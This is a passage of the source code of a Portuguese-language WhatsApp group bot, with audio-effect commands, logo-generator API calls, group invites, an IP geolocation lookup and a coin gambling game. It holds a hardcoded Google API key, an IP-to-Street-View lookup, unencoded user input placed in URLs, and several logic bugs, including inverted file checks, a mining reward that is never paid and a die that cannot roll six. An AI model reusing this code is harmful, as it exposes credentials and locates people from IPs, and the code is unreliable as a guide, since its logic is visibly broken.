await yoko.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o Ã¡udio..")
}
break

case 'bass': 
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(mess.wait())
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=20:width_type=o:width=2:g=15 ${ran}`, async(err, stderr, stdout) => {
await DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no Ã¡udio.')
hah = fs.readFileSync(ran)
await yoko.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o Ã¡udio...")
}
break

case 'bass2': 
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(mess.wait())
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, async(err, stderr, stdout) => {
await DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no Ã¡udio.')
hah = fs.readFileSync(ran)
await yoko.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o Ã¡udio..")
}
break

case 'estourar': 
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(mess.wait());
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -af equalizer=f=90:width_type=o:width=2:g=30 ${ran}`, async(err, stderr, stdout) => {
await DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no Ã¡udio.')
hah = fs.readFileSync(ran)
await yoko.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o Ã¡udio..")
}
break

case 'fast':
case 'audiorapido':  
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(mess.wait())
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, async(err, stderr, stdout) => {
await DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no Ã¡udio.')
hah = fs.readFileSync(ran)
await yoko.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o Ã¡udio...");
}
break

case 'esquilo':
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(mess.wait())
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.7,asetrate=65100" ${ran}`, async(err, stderr, stdout) => {
DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no Ã¡udio.')
hah = fs.readFileSync(ran)
await yoko.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o Ã¡udio...");
}
break

case 'audiolento': 
case 'slow':
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(mess.wait());
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, async(err, stderr, stdout) => {
DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no Ã¡udio.');
hah = fs.readFileSync(ran)
await yoko.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await DLT_FL(ran)
})
} else {
reply("Marque o Ã¡udio..")
}
break

/// LOGOS EPHOTO:
case 'angelwing':  case 'hackneon': case 'fpsmascote': 
case 'equipemascote': case 'txtquadrinhos': case 'ffavatar':
case 'mascotegame': case 'angelglx': case 'gizquadro': 
case 'wingeffect': case 'blackpink': case 'metalgold':
case 'girlmascote': case 'logogame':
try {
if(!q.trim()) return reply(`Digite algo, Exemplo: ${prefix+command} bronxys`);  
reply("â¯â¯Realizando comando...â®â®");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos_EPH?texto=${q}&category=${command}&apikey=${API_KEY_BRONXYS}`);
yoko.sendMessage(from, {image: {url: ABC.resultado}}, {quoted: info}).catch(() => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break;

case 'shadow': case 'metalgold': case 'cup': case 'txtborboleta':
case 'cemiterio': case 'efeitoneon': case 'harryp':
case 'lobometal': case 'neon2': case 'madeira': case 'lovemsg3':
case 'coffecup': case 'coffecup2': case 'florwooden':
case 'narutologo': case 'fire': case 'romantic': case 'smoke':  
case 'papel': case 'lovemsg': case 'lovemsg2':
try {
if(!q.trim()) return reply(`Digite algo, Exemplo: ${prefix+command} bronxys`);  
reply("â¯â¯Realizando comando...â®â®");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos_PHT?texto=${q}&category=${command}&apikey=${API_KEY_BRONXYS}`);
yoko.sendMessage(from, {image: {url: ABC.resultado.imageUrl}}, {quoted: info}).catch(() => {
return reply("Erro..")
})
} catch (e) {
return reply("Erro...");
}
break;

case 'fiction': case '3dstone': case 'areia': case 'style': 
case 'blood': case 'pink': case 'cattxt': case 'neondevil':
case 'carbon': case 'metalfire': case 'thunder': case 'vidro': 
case 'jokerlogo': case 'transformer': case 'demonfire':
case 'jeans': case 'metalblue': case 'natal': case 'ossos':
case 'asfalto': case 'break': case 'glitch2': case 'colaq':
case 'neon3': case 'nuvem': case 'horror': case 'matrix':
case 'berry': case 'luxury': case 'lava': case 'thunderv2':
case 'neongreen': case 'neve': case 'neon': case 'neon1':  
case 'neon3d': case 'gelo': case 'neon3': case '3dgold':
case 'lapis': case 'toxic': case 'demongreen': case 'rainbow':
case 'halloween':
try {
if(!q.trim()) return reply(`Digite algo, Exemplo: ${prefix+command} bronxys`);  
reply("â¯â¯Realizando comando...â®â®");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos?texto=${q}&category=${command}&apikey=${API_KEY_BRONXYS}`);
bufferImg(ABC.resultado);
} catch (e) {
return reply("Erro...");
}
break;

case 'marvel': case 'pornhub': case 'space': case 'stone': case 'steel': case 'grafity': case 'glitch3': case 'america':
try {
var [DG, DG2] = q.split("|")
if(!q.includes("|")) return reply(`Exemplo: ${prefix+command} Bronxys|Aleatory`)
reply("â¯â¯Realizando comando...â®â®");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/logos_2?texto=${DG}&texto2=${DG2}&category=${command}&apikey=${API_KEY_BRONXYS}`);
bufferImg(ABC.resultado);
} catch (e) {
return reply("Erro...");
}
break;

case 'convite':
if(!budy.includes("chat.whatsapp.com")) return reply("CadÃª o link do grupo que vocÃª deseja que eu entre?")  
cnvt = args.join(" ")
reply(`O convite para o bot entrar em seu grupo, foi enviado, espere o dono aceitar..`)
await yoko.sendMessage(nmrdn, {text: mess.groupInvitation(sender, cnvt, prefix)}, {quoted: selo})
break

case 'recusar':
if(!SoDono) return reply(mess.onlyOwner());
await yoko.sendMessage(`${q}@s.whatsapp.net`, {text: `OlÃ¡ amigo(a), sinto muito dizer, mas seu convite foi recusado.`}, {quoted: selo});
break

case 'join': case 'entrar':
if(!SoDono) return reply(mess.onlyOwner)
string = args.join(' ')
if(!string) return reply('Insira um link de convite ao lado do comando.')
if(string.includes('chat.whatsapp.com/') || reply('Ops, verifique o link que vocÃª inseriu.') ) {
link = string.split('app.com/')[1]
try {
yoko.groupAcceptInvite(`${link}`)
} catch(erro) {
if(String(erro).includes('resource-limit') ) {
reply('O grupo jÃ¡ estÃ¡ com o alcance de 257 membros.')
}
if(String(erro).includes('not-authorized') ) {
reply('NÃ£o foi possÃ­vel entrar no grupo.\nMotivo: Banimento.')
}
}
}
break

case 'sip': case 'ip': 
if (!q) return reply(`Informe o ip que vocÃª deseja! *Exemplo:* ${prefix+command} 8.8.8.8`)
try {
ip = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(q)}`);
await yoko.sendMessage(from, {image: {url: `https://maps.googleapis.com/maps/api/streetview?size=1400x1400&location=${ip.data.latitude},%20${ip.data.longitude}&sensor=false&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartNGg`}, caption: mess.searchIpAdress(ip)}, {quoted: selo});
await yoko.sendMessage(from, {location: {degreesLatitude: ip.data.latitude,degreesLongitude: ip.data.longitude, addrees: ''}}, {quoted: selo});
} catch(error) {
reply(mess.error())
}
break



case 'cassino': case 'slot':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`)
if(RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS].chances.cassino > 4) return reply(`Volte amanhÃ£! VocÃª consumiu todas suas 5 chances do dia no cassino.`);
if(RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS].coins < 29) return reply('Saldo insuficiente! Para usar os comandos de Coins, vocÃª deve ter pelo menos 30 N-Coins em sua carteira.');
!RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS] ? RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS].chances.cassino = 1 : RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS].chances.cassino += 1;
CoinsUpdate(RG_SCOINS);
var getResultSlot = ["ğŸ“", "ğŸ’", "ğŸ", "ğŸ‰"];
V_ = [0, 1, 2];
V_.forEach(function(one, two, three) {
    V_[two] = getResultSlot[Math.floor(Math.random() * getResultSlot.length)]
})
async function slot_(text) {
reply(`${text}\n[${V_[0]} | ${V_[1]} | ${V_[2]}] - VocÃª possuÃ­ *${RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS].chances.cassino}/5* chances no cassino por hoje.`);
}
if (V_[0] === V_[1] && V_[1] === V_[2] && V_[0] === V_[2]) {
await SYSTEM_COIN.AdicionarCoins(sender, 65);
slotMess = ['Parece que a sorte estava esperando por vocÃª! VocÃª acaba de levantar 65 N-Coins, aproveite vocÃª Ã© digno de ganhar. ğŸ’°â™¦ï¸', 'Que reviravolta! VocÃª saiu do cassino com 65 N-Coins no bolso! Quem disse que os jogos de azar nÃ£o valem a pena? â™¦ï¸ğŸ’°', 'Surpreendente! A sorte sorriu para vocÃª esta noite no cassino, vocÃª ganhou 65 N-Coins como recompensa! ğŸ°âœ¨'];
slot_(slotMess[Math.floor(Math.random() * slotMess.length)]);
} else {
await SYSTEM_COIN.RemoverCoins(sender, 5);
slotLoss = ['Que pena! VocÃª perdeu, o que resultarÃ¡ na perda de 5 N-Coins. Mas nÃ£o fique triste, na prÃ³xima vocÃª ganha! ğŸ™ğŸ¼â™¦ï¸', 'VocÃª perdeu, o que resultarÃ¡ a perda de 5 N-Coins! Com o tempo vocÃª recuperarÃ¡ e ultrapassarÃ¡ o valor perdido. ğŸ˜‡â™¦ï¸', 'Hoje a sorte nÃ£o estava de bom humor com sua pessoa, vocÃª perdeu, o que vai resultar a perda de 5 N-Coins. ğŸ¥±â˜ ï¸'];
slot_(slotLoss[Math.floor(Math.random() * slotLoss.length)])
}
break

case 'menu10':
case 'menucoins':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
await reagir(from, "ğŸª™");
mention(`ğŸ’° Seja bem vindo(a) @${sender.split("@")[0]} ao *'Menu N-Coins | Ayanokoji V1 Md ':
â€”
ğŸ‘‘ Donos & Administrador(es):
*01.* ${prefix}Sorteiocoins | ${prefix}Sortcoins
â€¢ Este comando tem a funÃ§Ã£o de sortear coins para os participantes do grupo, mas somente meu/minha proprietÃ¡rio(a) tem o poder de executar este comando.
${"â€“ ".repeat(14)}
*02.* ${prefix}Whatmusic | ${prefix}Gartic | ${prefix}Enigma | ${prefix}Quizanimais | ${prefix}Anagrama | ${prefix}Quizfutebol
â€¢ Vamos aumentar a quantidade de mensagens neste grupo? Temos 6 jogos ultra divertidos para interagir com seus participantes.
â€”
â™¦ï¸ Comandos de Membros:
*01.* ${prefix}Coins | ${prefix}Estatisticas
â€¢ Este comando tem a funÃ§Ã£o de mostrar a quantidade de coins e chances que vocÃª possuÃ­ atualmente no seu registro.
${"â€“ ".repeat(14)}
*02.* ${prefix}Dadoapostado
â€¢ Ei, vocÃª aÃ­! TÃ¡ afim de tentar sua sorte e vidÃªncia? Jogue este jogo e seja considerado um cigano do oriente hein!
${"â€“ ".repeat(14)}
*03.* ${prefix}Minerar | ${prefix}Minerarcoins
â€¢ Comece a explorar o minas de diamantes e ouros, Ã© ainda ganhe recompensas! Mas lembre-se vocÃª sÃ³ tem 6 chances diÃ¡rias hein, nÃ£o vai ultrapassar o limite ok?
${"â€“ ".repeat(14)}
*04.* ${prefix}Cassino | ${prefix}Slot
â€¢ Ei, vocÃª aÃ­! TÃ¡ afim de deixar eu sugar todo seu dinheiro na N-Coins? Vem comigo! Aqui vocÃª tem 5 chances diÃ¡rias, serÃ¡ que alguma vocÃª vai ter sorte de ganhar?`)
break

case 'coins': case 'estatisticas':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
await mention(`${tempo}, usuÃ¡rio(a): @${sender.split("@")[0]}, aqui estÃ¡ suas estatÃ­sticas na N-Coins:\nâ€”\nâ€¢ Saldo atual: '${RG_SCOINS[ID_G_COINS]?.usus[ID_USU_COINS]?.coins || 0} N-Coins'.\nâ€”\nğŸ’°â™¦ï¸ Chances:\n\tâ€¢ Quantidade de chances restantes para usar na mineraÃ§Ã£o: ${RG_SCOINS[ID_G_COINS]?.usus[ID_USU_COINS]?.chances.minerar || 0}/6\n\tâ€¢ Quantidade de chances restantes no cassino: ${RG_SCOINS[ID_G_COINS]?.usus[ID_USU_COINS]?.chances.cassino || 0}/5`);
break

case 'sorteiocoins': case 'sortcoins':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
if(!SoDono) return reply(mess.onlyOwner());
if(q.match(/[a-z]/i)) return reply("ï¸ï¸ğŸ˜­â™¦ï¸ Ã” chefe(a), assim vocÃª me quebra colocando letras invÃ©s de ser somente nÃºmeros. Por favor, um valor numÃ©rico justo para sortear...");
var LuckyUser = RG_SCOINS[ID_G_COINS].usus[Math.floor(Math.random() * RG_SCOINS[ID_G_COINS].usus.length)].id;
await mention(`ğŸ‰â™¦ï¸ ParabÃ©ns @${LuckyUser.split("@")[0]}, vocÃª acaba de ganhar: ${q.trim()} N-Coins. *Gaste com moderaÃ§Ã£o!*`);
SYSTEM_COIN.AdicionarCoins(LuckyUser, Math.floor(q.trim()));
break

case 'dadoapostado':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
var [numberDado, amountBet] = q.split('/');
if(!numberDado) return await reply(`VocÃª esqueceu de escolher o nÃºmero que vocÃª quer tirar, escolha um nÃºmero de 1 Ã  6. ApÃ³s escolher o nÃºmero, vocÃª irÃ¡ colocar uma (/) entre o nÃºmero e o valor apostado. Caso disperte dÃºvidas, veja o exemplo abaixo:\n\tâ€¢ *${prefix+command} nÃºmero/aposta*`);
if(!amountBet) return reply(`VocÃª esqueceu de colocar o valor que vocÃª deseja apostar...`);
if(SYSTEM_COIN.VerificarCampo(sender, "coins") < parseInt(amountBet)) return reply(`Ops, vocÃª nÃ£o tem essa quantidade de Coins para apostar. Verifique seu saldo usando:  '${prefix}saldo' e depois volte para apostar!`);
if(!Number(numberDado)) return reply(`${numberDado} nÃ£o Ã© nÃºmero!`);
if(!Number(amountBet)) return reply(`${amountBet} nÃ£o Ã© nÃºmero!`);
if(Number(amountBet) > 500) return reply(`NÃ£o Ã© possÃ­vel apostar mais de 500 N-Coins.`);
if(Number(numberDado) < 1 || Number(numberDado) > 6) return reply(`O nÃºmero estÃ¡ invÃ¡lido, pois nÃ£o existe um dado com a quantidade de '${numberDado}'. Por favor, informe um nÃºmero de 1 Ã  6!`);
await reagir(from, "ğŸ²");
await reply(`Sorteando dado(s)! â™¦ï¸â³ï¸`);
drawQuantity = Math.floor(Math.random() * 5) + 1;
await sendSticker(from, `./yoko/bunker/database/data/media/sticker/dados/${drawQuantity}.webp`, info);
if(Number(drawQuantity) === Number(numberDado)) {
setTimeout(async() => {
WINN = [`ğŸ²â™¦ï¸ ParabÃ©ns @${sender.split('@')[0]}, vocÃª acaba de ganhar ${parseInt(amountBet)} N-Coins, por ter acertado a previsÃ£o do dado.`, `ğŸ‰ğŸ’° ParabÃ©ns @${sender.split('@')[0]}, vocÃª ganhou ${parseInt(amountBet)} N-Coins, por acertar a previsÃ£o do dado.`];
await mention(WINN[Math.floor(Math.random() * WINN.length)]);
await SYSTEM_COIN.AdicionarCoins(sender, parseInt(amountBet));
}, 5000)
} else {
setTimeout(async() => {
PERDA = [`ğŸ¤§ Dessa vez *@${sender.split("@")[0]}*, vocÃª nÃ£o conseguiu acertar a previsÃ£o! Foi descontado de sua carteira: *${parseInt(amountBet)} N-Coins!`, `ğŸ˜¿ğŸ˜¨ Infelizmente *@${sender.split("@")[0]}*, vocÃª perdeu ${parseInt(amountBet)} por errar a previsÃ£o do dado.`];
await mention(PERDA[Math.floor(Math.random() * PERDA.length)]);
await SYSTEM_COIN.RemoverCoins(sender, parseInt(amountBet));
}, 5000);
}
break

case 'minerar': case 'minerarcoins':
if(!isGroup) return reply(mess.onlyGroup());
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
if(RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS].chances.minerar > 5) return reply(`Sinto muito, vocÃª nÃ£o tem mais chance para minerar hoje, porque vocÃª completou: 6/6.`);
!RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS] ? RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS].chances.minerar = 1 : RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS].chances.minerar += 1;
CoinsUpdate(RG_SCOINS); 
aleatValor = Math.floor(Math.random() * 2);
rndg = Math.floor(Math.random() * 300);
if(aleatValor == 0) {
randomMining = [
  `VocÃª estava minerando nas ilhas savitas e encontrou em seu caminho ${Number(rndg)} N-Coins em minerais preciosos! ğŸ’°`, 
  `ğŸ—£ğŸ’° VocÃª invadiu uma mina proibida e quando estava fazendo a mineraÃ§Ã£o achou ${Number(rndg)} N-Coins em troca de ouro!`, 
  `ğŸ’ğŸ‘·ğŸ»â€â™€ï¸ VocÃª invadiu uma mina de diamantes proibida, enquanto vocÃª estava fazendo a mineraÃ§Ã£o, encontrou 2 diamantes equivalentes Ã  ${Number(rndg)} N-Coins.`, 
  `â›ï¸ğŸ‘·ğŸ»â€â™€ï¸ VocÃª escavou uma mina de ouro subterrÃ¢nea em Minas Gerais e encontrou ${Number(rndg)} N-Coins!`, 
  `ğŸ›« Em uma de suas viagens para o interior da FlÃ³rida, vocÃª embarcou uma busca ao tesouro perdido e encontrou em seu caminho um cordÃ£o de ouro perdido avaliado em ${Number(rndg)} N-Coins.`, 
  `ğŸ˜±â™¦ï¸ VocÃª invadiu a casa do vizinho e encontrou ${Number(rndg)} N-Coins escavando o quintal dele.`, 
  `â›ï¸ğŸ‘·ğŸ»â€â™€ï¸âœ¨ï¸ VocÃª acaba de invadir em uma mina de esmeraldas desconhecida e encontrou ${Number(rndg)} N-Coins`, 
  `ğŸ›¥ï¸ğŸ’° VocÃª encontrou nas profundezas do oceanos, um tesouro em um navio antigo equivalente Ã  ${Number(rndg)} N-Coins.`, 
  `â™¦ï¸ VocÃª foi chamado para trabalhar na mina e encontrou milhares de resÃ­duos! Como recompensa, vocÃª acaba de ganhar ${Number(rndg)} N-Coins. ğŸ˜¸`, 
  `VocÃª foi chamado para trabalhar na mina e encontrou muitos tesouros perdidos!ğŸ‘·ğŸ¼â™¦ï¸ Como recompensa, vocÃª acaba de ganhar ${Number(rndg)} N-Coins.`
];
await reply(randomMining[Math.floor(Math.random() * randomMining.length)]);
(sender, rndg)
} else if(aleatValor != 0) {
miningFailureRX = [
  "ğŸ˜¥ Em sua tentativa de mineraÃ§Ã£o, nÃ£o foi possÃ­vel evidenciar nenhum mineral valioso!",
   "ğŸ˜¿ Em sua tentativa de mineraÃ§Ã£o, nÃ£o foi possÃ­vel evidenciar nenhuma joia valiosa em sua caÃ§ada misteriosa! â™¦ï¸", 
   "â›ï¸ğŸ’ Em sua tentativa de mineraÃ§Ã£o em Minas Gerais no Brasil, um estado particularmente rico em diamantes, mas vocÃª nÃ£o deu sorte em sua escavaÃ§Ã£o.", 
   "ğŸ˜¿â™¦ï¸ Em sua tentativa de mineraÃ§Ã£o, nÃ£o foi possÃ­vel evidenciar nenhum minÃ©rio validoso.", 
   "Particularmente, dessa vez vocÃª nÃ£o deu sorte em sua mineraÃ§Ã£o! Mas nÃ£o desista, vocÃª pode ter muitas chances de sucssso ainda hoje. OuÃ§a meus conselhos! â™¦ï¸",
   "A sorte virou sua inimiga por hoje! VocÃª nÃ£o conseguiu obter nenhum minÃ©rio em sua caÃ§ada! Mas nÃ£o desista! ğŸ˜"
];
miningFailure = miningFailureRX[Math.floor(Math.random() * miningFailureRX.length)];
miningFailure += RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS].chances.minerar >= 5 ? "\n> Infelizmente vocÃª nÃ£o tem mais chances para minerar hoje, volte amanhÃ£..." : `\n> Ainda lhe resta ${RG_SCOINS[ID_G_COINS].usus[ID_USU_COINS].chances.minerar}/6 para obter Coins por hoje, vocÃª pode minerar 6 vezes ao dia.`;
await reply(miningFailure);
}
break

case 'modocoins':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isModoCoins) return await mention(`'@${sender.split("@")[0]}' o sistema de Moedas jÃ¡ estÃ¡ ativado neste grupo atualmente, para desativar troque o 1 por 0.`);
dataGp[0].isModoCoins = true
setGp(dataGp)
await mention(`O sistema de Moedas neste grupo foi ativado com sucesso pelo administrador(a): '@${sender.split("@")[0]}'.`);
} else if(Number(args[0]) === 0) {
if(!isModoCoins) return await mention(`'@${sender.split("@")[0]}' o sistema de Moedas jÃ¡ estÃ¡ desativado neste grupo atualmente, para desativar troque o 0 por 1.`);
dataGp[0].isModoCoins = false
setGp(dataGp)
await mention(`O sistema de Moedas neste grupo foi desativado com Ãªxito pelo administrador(a): '@${sender.split("@")[0]}'.`);
} else {
await reply('Use 0 para desativar a funÃ§Ã£o e 1 para ativar a funÃ§Ã£o em seu grupo.');
}
break

case 'revelargartic':  
if (!isGroupAdmins) return reply('Somente adms podem ver a(s) resposta(s) do jogos!')
if(fs.existsSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`)) return reply("NÃ£o existe nenhuma partida atual do jogo neste grupo.")
let dataAnagramaa = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/gartic/${from}.json`))
reply(`â€¢ OlÃ¡ *${pushname}*, a resposta correta da afirmaÃ§Ã£o era: ${II}${dataAnagramaa.resposta}${II}\nâ€¢ Envie a resposta apresentada acima para passar a prÃ³xima..`)
break

case 'revelarenigma':
if (!isGroupAdmins) return reply('Somente adms podem ver a(s) resposta(s) do jogos!');
if(fs.existsSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`)) return reply("NÃ£o existe nenhuma partida atual do jogo neste grupo.");
let eni1 = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/enigma/${from}.json`))
reply(`â€¢ OlÃ¡ *${pushname}*, a resposta correta do enigma era: ${II}${eni1.respostaEne}${II}\nâ€¢ Envie a resposta apresentada acima para passar a prÃ³xima..`)
break

case 'anagrama':
if (!isGroup) return reply(mess.onlyGroup()) 
if (!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
if(args.length == 0) return reply('Use 1 para ativar o jogo do anagrama, ou seja, para desativar utilize o valor numÃ©rico 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./yoko/bunker/database/grupos/games/anagrama/${from}.json`)) {
an = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/anagrama/${from}.json`))
reply(`â€¢ JÃ¡ existe um registro da ativaÃ§Ã£o do anagrama aqui no grupo, resolva abaixo, caso desejar resetar ou desativar, use: *${prefix}anagrama 1/0*\nâ€”\nâ­ï¸ Qual Ã© a ordem correta da palavra? Resolva: *${an.embaralhada}*\nâ€¢ Dica: ${an.dica}`)
} else {
fs.writeFileSync(`./yoko/bunker/database/grupos/games/anagrama/${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
await yoko.sendMessage(from, {text: `â™¦ï¸ğŸ˜² Decifre a palavra embaralhada abaixo, qual serÃ¡ a ordem correta das letras?\nâ€”\nâ€¢ Palavra: *${shuffle(palavrasANA[anaaleatorio].palavraOriginal)}*\nâ€¢ Dica: ${palavrasANA[anaaleatorio].dica}`}, {quoted: selo})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./yoko/bunker/database/grupos/games/anagrama/${from}.json`)) return reply('NÃ£o tem como desativar o jogo do anagrama pÃ´s ele nÃ£o foi ativado...')
fs.unlinkSync(`./yoko/bunker/database/grupos/games/anagrama/${from}.json`)
reply("Desativado com sucesso.")
}
break

case 'quizanimais':
if (!isGroup) return reply(mess.onlyGroup());
if (!isGroupAdmins) return reply(mess.onlyAdmins());
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
const animaisquiz = Math.floor(Math.random() * quizanimais.length)
if(args.length == 0) return reply('Use 1 para ativar o quiz animais, ou seja, para desativar utilize o valor numÃ©rico 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./yoko/bunker/database/grupos/games/quiz-animais/${from}.json`)) {
superrttrr = JSON.parse(fs.readFileSync(`./yoko/bunker/database/grupos/games/quiz-animais/${from}.json`))
imagemtexto = `â€¢ Existe um jogo existente, aqui no grupo! Resolva a pergunta abaixo:\nâ€”\nğŸ¤” Pergunta: ${superrttrr.question}`
wew = await getBuffer(`${superrttrr.foto}`)   
await yoko.sendMessage(from, {image: wew, caption: imagemtexto}, {quoted: selo})
} else {
fs.writeFileSync(`./yoko/bunker/database/grupos/games/quiz-animais/${from}.json`, `${JSON.stringify(quizanimais[animaisquiz])}`)
wew = await getBuffer(`${quizanimais[animaisquiz].foto}`)  
await yoko.sendMessage(from, {image: wew, caption: `ğŸ¤” Pergunta: ${quizanimais[animaisquiz].question}`}, {quoted: selo})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./yoko/bunker/database/grupos/games/quiz-animais/${from}.json`)) return reply('NÃ£o tem como desativar o jogo pÃ´s ele nÃ£o foi ativado')
fs.unlinkSync(`./yoko/bunker/database/grupos/games/quiz-animais/${from}.json`)
reply("Desativado com sucesso.")
}
break

case 'whatmusic':
if (!isGroup) return reply(mess.onlyGroup()) 
if (!isGroupAdmins) return reply(mess.onlyAdmins());
if(!isModoCoins) return reply(`Este comando sÃ³ pode ser utilizado quando o sistema ${prefix}modocoins estÃ¡ ativado no grupo.`);
const whatMAle = Math.floor(Math.random() * whatMusicAr.length)
if(args.length == 0) return reply('Use 1 para ativar o jogo, ou seja, para desativar utilize o valor numÃ©rico 0')
if (args.join(' ') === '1') {
